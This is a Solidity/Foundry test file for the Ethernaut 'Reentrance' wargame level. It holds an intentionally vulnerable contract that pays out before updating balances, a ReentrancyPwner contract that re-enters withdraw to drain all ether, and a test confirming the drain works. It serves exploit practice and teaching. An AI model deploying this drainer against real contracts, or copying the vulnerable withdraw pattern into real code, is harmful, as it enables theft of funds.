// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
    //
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        unchecked {
            // bc after Solidity 0.8.0
            if (balances[msg.sender] >= _amount) {
                (bool result,) = msg.sender.call{value: _amount}("");
                if (result) {
                    _amount;
                }
                balances[msg.sender] -= _amount;
            }
        }
    }

    receive() external payable {}
}

interface IReentrancy {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyPwner {
    //
    IReentrancy public target;
    uint256 initialDeposit;

    constructor(address targetAddress) {
        target = IReentrancy(targetAddress);
    }

    function pwn() external payable {
        require(msg.value >= 0.1 ether, "Send more ether");

        // make initial deposit
        initialDeposit = msg.value;
        target.donate{value: initialDeposit}(address(this));

        // withdraw over and over again
        callWithdraw();
    }

    receive() external payable {
        // reentrance, called by target
        callWithdraw();
    }

    function callWithdraw() private {
        uint256 targetTotalRemainingBalance = address(target).balance;
        bool moreToSteal = targetTotalRemainingBalance > 0;

        if (moreToSteal) {
            uint256 toWithdraw =
                initialDeposit < targetTotalRemainingBalance ? initialDeposit : targetTotalRemainingBalance;
            target.withdraw(toWithdraw);
        }
    }
}

// contract ReentrancyPwner {
//     //
//     uint256 targetBalance;
//     bool set;

//     fallback() external payable {
//         if (!set) {
//             targetBalance = payable(msg.sender).balance;
//             set = true;
//         }

//         if (targetBalance >= 1 ether) {
//             IReentrancy(msg.sender).withdraw(1 ether);
//             targetBalance -= 1 ether;
//         }
//     }
// }

contract ReentrancyEthernautTest is Test {
    //
    Reentrance target;
    address payable payableTarget;

    function setUp() public {
        target = new Reentrance();
        payableTarget = payable(target);

        payableTarget.transfer(10 ether); // load up target w/ ether
    }

    function testCanPayDirectly() public {
        payableTarget.transfer(1 ether);

        assertEq(payableTarget.balance, 11 ether);
    }

    function testDonate() public {
        target.donate{value: 0.1 ether}(address(0xBABE));

        assertEq(target.balanceOf(address(0xBABE)), 0.1 ether);
        assertEq(payableTarget.balance, 10.1 ether);
    }

    function testMultipleDonations() public {
        target.donate{value: 0.1 ether}(address(0xBABE));
        target.donate{value: 0.7 ether}(address(0xBABE));
        target.donate{value: 1.5 ether}(address(0xCAFE));
        target.donate{value: 19 ether}(address(0xBEEF));

        assertEq(target.balanceOf(address(0xBABE)), 0.8 ether);
        assertEq(target.balanceOf(address(0xCAFE)), 1.5 ether);
        assertEq(target.balanceOf(address(0xBEEF)), 19 ether);
        assertEq(payableTarget.balance, 31.3 ether);
    }

    function testWithdraw() public {
        assertEq(payable(address(0xBABE)).balance, 0 ether);

        target.donate{value: 0.1 ether}(address(0xBABE));

        assertEq(payableTarget.balance, 10.1 ether);

        vm.prank(address(0xBABE));
        target.withdraw(0.1 ether);

        assertEq(payable(address(0xBABE)).balance, 0.1 ether);
        assertEq(payableTarget.balance, 10 ether);
    }

    function testMultipleWithdraws() public {
        assertEq(payable(address(0xBABE)).balance, 0 ether);
        assertEq(payable(address(0xCAFE)).balance, 0 ether);
        assertEq(payable(address(0xBEEF)).balance, 0 ether);

        target.donate{value: 0.8 ether}(address(0xBABE));
        target.donate{value: 1.5 ether}(address(0xCAFE));
        target.donate{value: 19 ether}(address(0xBEEF));

        assertEq(payableTarget.balance, 31.3 ether);

        vm.prank(address(0xBABE));
        target.withdraw(0.1 ether);
        vm.prank(address(0xCAFE));
        target.withdraw(1.5 ether);
        vm.prank(address(0xBABE));
        target.withdraw(0.7 ether);
        vm.prank(address(0xBEEF));
        target.withdraw(19 ether);

        assertEq(payable(address(0xBABE)).balance, 0.8 ether);
        assertEq(payable(address(0xCAFE)).balance, 1.5 ether);
        assertEq(payable(address(0xBEEF)).balance, 19 ether);
        assertEq(payableTarget.balance, 10 ether);
    }

    function testPwn() public {
        ReentrancyPwner pwner = new ReentrancyPwner(payableTarget);

        assertEq(payableTarget.balance, 10 ether);
        assertEq(address(pwner).balance, 0 ether);

        vm.deal(address(pwner), 0.1 ether);
        vm.startPrank(address(pwner));
        pwner.pwn{value: 0.1 ether}();

        assertEq(payableTarget.balance, 0 ether);
        assertEq(address(pwner).balance, 10.1 ether);
    }

    // function testPwn() public {
    //     ReentrancyPwner pwner = new ReentrancyPwner();

    //     emit log_named_uint("Pre-pwn pwner balance: ", payable(pwner).balance);
    //     emit log_named_uint("Pre-pwn target balance: ", payableTarget.balance);

    //     // given made initial donation for pwner address
    //     target.donate{value: 1 ether}(address(pwner));

    //     assertEq(target.balanceOf(address(pwner)), 1 ether);

    //     // when withdraw to contract address with cycical fallback() function
    //     vm.prank(address(pwner));
    //     target.withdraw(1 ether);
    //     // try target.withdraw(1 ether) {
    //     // } catch {
    //     // }

    //     // // then should drain entire ether balance
    //     assertEq(payable(pwner).balance, 11 ether);
    //     emit log_named_uint("Post-pwn pwner balance: ", payable(pwner).balance);
    //     emit log_named_uint("Post-pwn target balance: ", payableTarget.balance);
    // }
}
